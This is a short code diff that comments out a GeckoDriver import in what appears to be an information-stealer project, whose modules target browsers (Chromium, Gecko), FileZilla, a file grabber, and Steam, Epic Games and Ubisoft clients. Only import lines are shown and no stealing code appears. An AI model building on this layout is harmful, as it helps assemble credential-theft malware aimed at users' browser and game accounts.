@@ -2,7 +2,7 @@ from targets.files.files import TxtFiles
 # from targets.files.filezilla import FileZilla
 from targets.files.file_grabber import Grab
 from targets.browsers.chromium import Chromium
-from targets.browsers.geckodriver import GeckoDriver
+# from targets.browsers.geckodriver import GeckoDriver
 from targets.games.steam import Steam
 from targets.games.epicgames import Epic
 from targets.games.uplay import Ubisoft
